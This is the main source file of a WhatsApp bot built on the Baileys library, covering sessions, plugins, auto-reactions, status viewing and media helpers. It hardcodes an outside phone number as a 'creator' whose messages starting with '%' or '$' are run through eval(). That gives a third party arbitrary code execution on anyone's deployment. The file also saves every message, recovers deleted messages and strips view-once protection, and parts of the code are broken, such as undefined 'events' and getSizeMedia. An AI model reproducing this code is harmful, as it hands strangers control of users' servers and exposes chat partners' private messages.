const {
  default: makeWASocket,
  useMultiFileAuthState,
  DisconnectReason,
  jidNormalizedUser,
  isJidBroadcast,
  getContentType,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  AnyMessageContent,
  prepareWAMessageMedia,
  areJidsSameUser,
  downloadContentFromMessage,
  MessageRetryMap,
  generateForwardMessageContent,
  generateWAMessageFromContent,
  generateMessageID,
  makeInMemoryStore,
  jidDecode,
  fetchLatestBaileysVersion,
  Browsers
} = require('@whiskeysockets/baileys');

const l = console.log;
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions');
const {
  AntiDelDB,
  initializeAntiDeleteSettings,
  setAnti,
  getAnti,
  getAllAntiDeleteSettings,
  saveContact,
  loadMessage,
  getName,
  getChatSummary,
  saveGroupMetadata,
  getGroupMetadata,
  saveMessageCount,
  getInactiveGroupMembers,
  getGroupMembersMessageCount,
  saveMessage
} = require('./data');
const fs = require('fs');
const ff = require('fluent-ffmpeg');
const P = require('pino');
const config = require('./config');
const GroupEvents = require('./lib/groupevents');
const qrcode = require('qrcode-terminal');
const StickersTypes = require('wa-sticker-formatter');
const util = require('util');
const { sms, downloadMediaMessage, AntiDelete } = require('./lib');
const FileType = require('file-type');
const axios = require('axios');
const { fromBuffer } = require('file-type');
const bodyparser = require('body-parser');
const os = require('os');
const Crypto = require('crypto');
const path = require('path');

const prefix = config.PREFIX;
const mode = config.MODE;
const online = config.ALWAYS_ONLINE;
const status = config.AUTO_STATUS_SEEN;
const ownerNumber = ['254104260236'];

const tempDir = path.join(os.tmpdir(), 'cache-temp');
if (!fs.existsSync(tempDir)) {
  fs.mkdirSync(tempDir);
}

const clearTempDir = () => {
  fs.readdir(tempDir, (err, files) => {
    if (err) throw err;
    for (const file of files) {
      fs.unlink(path.join(tempDir, file), err => {
        if (err) throw err;
      });
    }
  });
};

// Clear the temp directory every 5 minutes
setInterval(clearTempDir, 5 * 60 * 1000);

//===================SESSION-AUTH========================
const credsPath = path.join(__dirname, 'sessions', 'creds.json');
if (!fs.existsSync(credsPath)) {
  if (!config.SESSION_ID) {
    console.error('❌ SESSION_ID is not set! No session file found.');
    console.log('🟡 Falling back to pairing code login...');
  } else {
    try {
      const base64 = config.SESSION_ID.includes("Bellah~")
        ? config.SESSION_ID.split("Bellah~")[1]
        : config.SESSION_ID;
      const sessionBuffer = Buffer.from(base64, 'base64');
      fs.mkdirSync(path.dirname(credsPath), { recursive: true });
      fs.writeFileSync(credsPath, sessionBuffer);
      console.log('✅ Session restored from SESSION_ID');
    } catch (err) {
      console.error('❌ Failed to decode/write session:', err);
      process.exit(1);
    }
  }
}

//=====================================
const express = require('express');
const app = express();
const port = process.env.PORT || 9090;
//==================================
     async function connectToWA() {
  console.log("Connecting to WhatsApp ⏳️...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()

  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.ubuntu("Chrome"),
          syncFullHistory: true,
          auth: state,
          version
          })

  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
  setTimeout(connectToWA, 5000) // Added delay before reconnect
  }
  } else if (connection === 'open') {
  console.log('🧬 Installing Plugins')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('Plugins installed successful ✅')
  console.log('Bot connected to whatsapp ✅')

  let up = `*𝐇𝐄𝐋𝐋𝐎 𝐓𝐇𝐄𝐑𝐄 𝐃𝐀𝐕𝐄-𝐌𝐃 𝐁𝐎𝐓👑*
*𝐂𝐎𝐍𝐍𝐄𝐂𝐓𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘!*
*╭───━━━━───━━━━──┉┈⚆*
*│• 𝐓𝐘𝐏𝐄 .𝐌𝐄𝐍𝐔 𝐓𝐎 𝐒𝐄𝐄 𝐋𝐈𝐒𝐓 •*
*│• 𝐁𝐎𝐓 𝐀𝐌𝐀𝐙𝐈𝐍𝐆 𝐅𝐄𝐀𝐓𝐔𝐑𝐄𝐒 •*
*│• 𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑 : DAVE*
*│• 𝐀𝐋𝐖𝐀𝐘𝐒 𝐎𝐍𝐋𝐈𝐍𝐄 : ${online}*
*│• 𝐏𝐑𝐄𝐅𝐈𝐗 : ${prefix}*
*│• 🪾𝐌𝐎𝐃𝐄 : ${mode}*
*│• 🪄𝐒𝐓𝐀𝐓𝐔𝐒 𝐕𝐈𝐄𝐖𝐒 : ${status}*
*│• 🫟𝐕𝐄𝐑𝐒𝐈𝐎𝐍 : 1.0.0*
*┗───━━━━───━━━━──┉┈⚆*`;
            conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/3hrxbh.jpg` }, caption: up }).catch(e => console.log('Welcome message error:', e))
  }
  })
  conn.ev.on('creds.update', saveCreds)
  conn.ev.on("messages.upsert", async ({ messages }) => { // Fixed handler
    try {
      const m = messages[0]
      if (!m.message) return
      const body = m.message.conversation || m.message.extendedTextMessage?.text || ''
      if (body === 'ping') await conn.sendMessage(m.key.remoteJid, { text: 'Pong!' }) // Test response
    } catch (e) { console.log('Message handling error:', e) }
  })
//------------------------------------------------------
  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates).catch(e => console.log('AntiDelete error:', e))
      }
    }
  });
  //============================== 

  //=============readstatus=======

  conn.ev.on('messages.upsert', async(mek) => {
    try {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]).catch(e => console.log('Read error:', e))
    }
    if(mek.message.viewOnceMessageV2)
    mek.message = mek.message.viewOnceMessageV2.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key]).catch(e => console.log('Status read error:', e))
    }
      if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
  try {
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '🎎', '🎏', '🎐', '⚽', '🧣', '🌿', '⛈️', '🌦️', '🌚', '🌝', '🙈', '🙉', '🦖', '🐤', '🎗️', '🥇', '👾', '🔫', '🐝', '🦋', '🍓', '🍫', '🍭', '🧁', '🧃', '🍿', '🍻', '🎀', '🧸', '👑', '〽️', '😳', '💀', '☠️', '👻', '🔥', '♥️', '👀', '🐼'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  } catch (e) {
    console.error('Failed to react to status:', e);
  }
}                       
if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  try {
    const user = mek.key.participant;
    const text = `${config.AUTO_STATUS_MSG}`;
    await conn.sendMessage(user, { text: text, react: { text: '💜', key: mek.key } }, { quoted: mek });
  } catch (e) {
    console.error('Failed to reply to status:', e);
  }
}

try {
  await saveMessage(mek);
} catch (e) {
  console.error('Failed to save message:', e);
}

const m = sms(conn, mek);
const type = getContentType(mek.message);
const content = JSON.stringify(mek.message);
const from = mek.key.remoteJid;
const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage?.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage : null;
const body = (type === 'conversation') ? mek.message.conversation : 
            (type === 'extendedTextMessage') ? mek.message.extendedTextMessage?.text : 
            (type == 'imageMessage') ? mek.message.imageMessage?.caption || '' :
            (type == 'videoMessage') ? mek.message.videoMessage?.caption || '' : '';

// Ensure body is always a string
const messageBody = typeof body === 'string' ? body : '';
const isCmd = messageBody.startsWith(prefix);

// Rest of your variable declarations remain the same
var budy = typeof mek.text == 'string' ? mek.text : false;
const command = isCmd ? messageBody.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
const args = messageBody.trim().split(/ +/).slice(1);
const q = args.join(' ');
const text = args.join(' ');
const isGroup = from.endsWith('@g.us');
const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid);
const senderNumber = sender.split('@')[0];
const botNumber = conn.user.id.split(':')[0];
const pushname = mek.pushName || 'Sin Nombre';
const isMe = botNumber.includes(senderNumber);
const isOwner = ownerNumber.includes(senderNumber) || isMe;
const botNumber2 = await jidNormalizedUser(conn.user.id);
const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : '';
const groupName = isGroup ? groupMetadata?.subject || '' : '';
const participants = isGroup ? groupMetadata?.participants || [] : [];
const groupAdmins = isGroup ? await getGroupAdmins(participants).catch(e => []) : [];
const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false;
const isAdmins = isGroup ? groupAdmins.includes(sender) : false;
const isReact = m.message?.reactionMessage ? true : false;

const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek }).catch(e => console.error('Reply failed:', e));
};

// Rest of your creator/eval code remains exactly the same
const udp = botNumber.split('@')[0];
const jawad = ('923003588997');
let isCreator = [udp, jawad, config.DEV]
  .map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
  .includes(mek.sender);


    if (isCreator && mek.text.startsWith('%')) {
                                        let code = budy.slice(2);
                                        if (!code) {
                                                reply(
                                                        `Provide me with a query to run Master!`,
                                                );
                                                return;
                                        }
                                        try {
                                                let resultTest = eval(code);
                                                if (typeof resultTest === 'object')
                                                        reply(util.format(resultTest));
                                                else reply(util.format(resultTest));
                                        } catch (err) {
                                                reply(util.format(err));
                                        }
                                        return;
                                }
      if (isCreator && mek.text.startsWith('$')) {
                                        let code = budy.slice(2);
                                        if (!code) {
                                                reply(
                                                        `Provide me with a query to run Master!`,
                                                );
                                                return;
                                        }
                                        try {
                                                let resultTest = await eval(
                                                        'const a = async()=>{\n' + code + '\n}\na()',
                                                );
                                                let h = util.format(resultTest);
                                                if (h === undefined) return console.log(h);
                                                else reply(h);
                                        } catch (err) {
                                                if (err === undefined)
                                                        return console.log('error');
                                                else reply(util.format(err));
                                        }
                                        return;
  }
      //================ownerreact==============
if(senderNumber.includes("923003588997")){
  if(isReact) return;
  try {
    await m.react("🦋"); 
    await m.react("🪄");
    await m.react("👑");
  } catch (e) {}
}
//==========public react============//
if (!isReact && senderNumber !== botNumber) {
  if (config.AUTO_REACT === 'true') {
    const reactions = ['❤️','😂','👍','🔥','😎','👑','💯']; // Reduced emoji set
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    try {
      await m.react(randomReaction);
    } catch (e) {}
  }
}
// Owner React
if (!isReact && senderNumber === botNumber) {
  if (config.AUTO_REACT === 'true') {
    const reactions = ['❤️','😂','👍','🔥','😎','👑','💯']; // Same reduced set
    const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
    try {
      await m.react(randomReaction);
    } catch (e) {}
  }
                   }
      // Custom react settings
if (!isReact) {
    if (config.CUSTOM_REACT === 'true') {
        try {
            const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
            const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
            await m.react(randomReaction).catch(e => console.error('React failed:', e));
        } catch (e) {
            console.error('Custom react error:', e);
        }
    }
}

// Worktype restrictions
if (!isOwner) {
    if (config.MODE === "private") return;
    if (isGroup && config.MODE === "inbox") return;
    if (!isGroup && config.MODE === "groups") return;
}

// Command handling
if (isCmd) {
    try {
        const cmdName = body.slice(1).trim().split(" ")[0].toLowerCase();
        const cmd = events.commands.find(c => c.pattern === cmdName) || 
                   events.commands.find(c => c.alias?.includes(cmdName));
        
        if (cmd) {
            if (cmd.react) {
                await conn.sendMessage(from, { 
                    react: { 
                        text: cmd.react, 
                        key: mek.key 
                    } 
                }).catch(e => console.error('Command react failed:', e));
            }
            
            await cmd.function(conn, mek, m, {
                from, quoted, body, isCmd, command: cmdName, 
                args: body.trim().split(/ +/).slice(1),
                q: body.trim().split(/ +/).slice(1).join(' '),
                text: body.trim().split(/ +/).slice(1).join(' '),
                isGroup, sender, senderNumber, botNumber2, 
                botNumber, pushname, isMe, isOwner, 
                isCreator, groupMetadata, groupName, 
                participants, groupAdmins, isBotAdmins, 
                isAdmins, reply
            });
        }
    } catch (e) {
        console.error("[COMMAND ERROR] " + e);
        await conn.sendMessage(from, { 
            text: `❌ Command execution failed: ${e.message}` 
        }).catch(e => console.error('Error message send failed:', e));
    }
}
  // Command execution with better async handling
await Promise.all(events.commands.map(async (command) => {
  try {
    const shouldExecute = 
      (body && command.on === "body") ||
      (mek.q && command.on === "text") ||
      ((command.on === "image" || command.on === "photo") && mek.type === "imageMessage") ||
      (command.on === "sticker" && mek.type === "stickerMessage");

    if (shouldExecute) {
      const context = {
        from, l, quoted, body, isCmd, command, args, q, text, 
        isGroup, sender, senderNumber, botNumber2, botNumber, 
        pushname, isMe, isOwner, isCreator, groupMetadata, 
        groupName, participants, groupAdmins, isBotAdmins, 
        isAdmins, reply
      };
      await command.function(conn, mek, m, context);
    }
  } catch (error) {
    console.error('Error executing command:', error);
    // Optionally send error notification
  }
}));

// Utility functions remain the same
conn.decodeJid = jid => {
  if (!jid) return jid;
  if (/:\d+@/gi.test(jid)) {
    let decode = jidDecode(jid) || {};
    return (
      (decode.user && decode.server && decode.user + '@' + decode.server) || jid
    );
  }
  return jid;
};

conn.copyNForward = async (jid, message, forceForward = false, options = {}) => {
  let vtype;
  if (options.readViewOnce) {
    message.message = message.message?.ephemeralMessage?.message || message.message;
    vtype = Object.keys(message.message.viewOnceMessage.message)[0];
    delete message.message?.ignore;
    delete message.message.viewOnceMessage.message[vtype].viewOnce;
    message.message = { ...message.message.viewOnceMessage.message };
  }

  let mtype = Object.keys(message.message)[0];
  let content = await generateForwardMessageContent(message, forceForward);
  let ctype = Object.keys(content)[0];
  let context = {};
  
  if (mtype !== "conversation") context = message.message[mtype]?.contextInfo || {};
  
  content[ctype].contextInfo = { ...context, ...content[ctype].contextInfo };
  
  const waMessage = await generateWAMessageFromContent(
    jid, 
    content, 
    options ? {
      ...content[ctype],
      ...options,
      ...(options.contextInfo ? {
        contextInfo: {
          ...content[ctype].contextInfo,
          ...options.contextInfo
        }
      } : {})
    } : {}
  );
  
  await conn.relayMessage(jid, waMessage.message, { messageId: waMessage.key.id });
  return waMessage;
};
      /**
 * Downloads and saves media from a message
 * @param {Object} message - The message object containing media
 * @param {string} filename - Base filename to save as
 * @param {boolean} [attachExtension=true] - Whether to append file extension
 * @returns {Promise<string>} The saved filename
 */
conn.downloadAndSaveMediaMessage = async (message, filename, attachExtension = true) => {
  try {
    const quoted = message.msg || message;
    const mime = quoted.mimetype || '';
    const messageType = message.mtype 
      ? message.mtype.replace(/Message/gi, '') 
      : mime.split('/')[0];
    
    const stream = await downloadContentFromMessage(quoted, messageType);
    let buffer = Buffer.from([]);
    
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    
    const fileType = await FileType.fromBuffer(buffer);
    const trueFileName = attachExtension 
      ? `${filename}.${fileType.ext}` 
      : filename;
    
    await fs.promises.writeFile(trueFileName, buffer);
    return trueFileName;
  } catch (error) {
    console.error('Failed to download/save media:', error);
    throw error;
  }
};

/**
 * Downloads media from a message
 * @param {Object} message - The message object containing media
 * @returns {Promise<Buffer>} The media buffer
 */
conn.downloadMediaMessage = async (message) => {
  try {
    const mime = (message.msg || message).mimetype || '';
    const messageType = message.mtype 
      ? message.mtype.replace(/Message/gi, '') 
      : mime.split('/')[0];
    
    const stream = await downloadContentFromMessage(message, messageType);
    let buffer = Buffer.from([]);
    
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }
    
    return buffer;
  } catch (error) {
    console.error('Failed to download media:', error);
    throw error;
  }
};

/**
 * Sends a file from URL with automatic type detection
 * @param {string} jid - The chat ID
 * @param {string} url - The file URL
 * @param {string} caption - File caption
 * @param {Object} [quoted] - Quoted message
 * @param {Object} [options] - Additional options
 */
conn.sendFileUrl = async (jid, url, caption, quoted, options = {}) => {
  try {
    const res = await axios.head(url);
    const mime = res.headers['content-type'];
    const [type, subtype] = mime.split('/');
    const buffer = await getBuffer(url);

    const sendOptions = { 
      ...options, 
      caption,
      mimetype: mime,
      quoted 
    };

    switch (true) {
      case subtype === 'gif':
        return conn.sendMessage(jid, { 
          video: buffer, 
          caption,
          gifPlayback: true,
          ...options 
        }, { quoted, ...options });

      case mime === 'application/pdf':
        return conn.sendMessage(jid, { 
          document: buffer, 
          caption,
          ...options 
        }, sendOptions);

      case type === 'image':
        return conn.sendMessage(jid, { 
          image: buffer, 
          caption,
          ...options 
        }, sendOptions);

      case type === 'video':
        return conn.sendMessage(jid, { 
          video: buffer, 
          caption,
          ...options 
        }, sendOptions);

      case type === 'audio':
        return conn.sendMessage(jid, { 
          audio: buffer, 
          caption,
          ...options 
        }, sendOptions);

      default:
        throw new Error(`Unsupported file type: ${mime}`);
    }
  } catch (error) {
    console.error('Failed to send file from URL:', error);
    throw error;
  }
};

/**
 * Modifies a message copy
 * @param {string} jid - The chat ID
 * @param {Object} copy - The message copy
 * @param {string} [text=''] - New text content
 * @param {string} [sender] - Sender ID
 * @param {Object} [options] - Additional options
 * @returns {Object} Modified WebMessageInfo
 */
conn.cMod = (jid, copy, text = '', sender = conn.user.id, options = {}) => {
  const mtype = Object.keys(copy.message)[0];
  const isEphemeral = mtype === 'ephemeralMessage';
  const actualType = isEphemeral 
    ? Object.keys(copy.message.ephemeralMessage.message)[0] 
    : mtype;
  
  const msg = isEphemeral 
    ? copy.message.ephemeralMessage.message 
    : copy.message;
  
  const content = msg[actualType];

  if (typeof content === 'string') {
    msg[actualType] = text || content;
  } else if (content.caption) {
    content.caption = text || content.caption;
  } else if (content.text) {
    content.text = text || content.text;
  }

  if (typeof content !== 'string') {
    msg[actualType] = { ...content, ...options };
  }

  if (copy.key.participant) {
    sender = copy.key.participant = sender || copy.key.participant;
  } else if (copy.key.remoteJid.includes('@s.whatsapp.net') || 
             copy.key.remoteJid.includes('@broadcast')) {
    sender = sender || copy.key.remoteJid;
  }

  copy.key.remoteJid = jid;
  copy.key.fromMe = sender === conn.user.id;

  return proto.WebMessageInfo.fromObject(copy);
};

/**
 * Gets file data from various sources
 * @param {string|Buffer} PATH - File path, URL, or buffer
 * @param {boolean} [save] - Whether to save the file
 * @returns {Promise<Object>} File information
 */
conn.getFile = async (PATH, save) => {
  try {
    let data, res;
    const isBuffer = Buffer.isBuffer(PATH);
    const isDataURI = /^data:.*?\/.*?;base64,/i.test(PATH);
    const isURL = /^https?:\/\//.test(PATH);
    const exists = !isBuffer && !isDataURI && !isURL && fs.existsSync(PATH);

    if (isBuffer) {
      data = PATH;
    } else if (isDataURI) {
      data = Buffer.from(PATH.split(',')[1], 'base64');
    } else if (isURL) {
      res = await getBuffer(PATH);
      data = res;
    } else if (exists) {
      data = fs.readFileSync(PATH);
    } else if (typeof PATH === 'string') {
      data = PATH;
    } else {
      data = Buffer.alloc(0);
    }

    const type = await FileType.fromBuffer(data) || {
      mime: 'application/octet-stream',
      ext: '.bin'
    };

    const filename = path.join(
      __dirname, 
      `temp_${Date.now()}.${type.ext}`
    );

    if (data && save) {
      await fs.promises.writeFile(filename, data);
    }

    return {
      res,
      filename,
      size: await getSizeMedia(data),
      ...type,
      data
    };
  } catch (error) {
    console.error('Failed to get file:', error);
    throw error;
  }

  
};
      
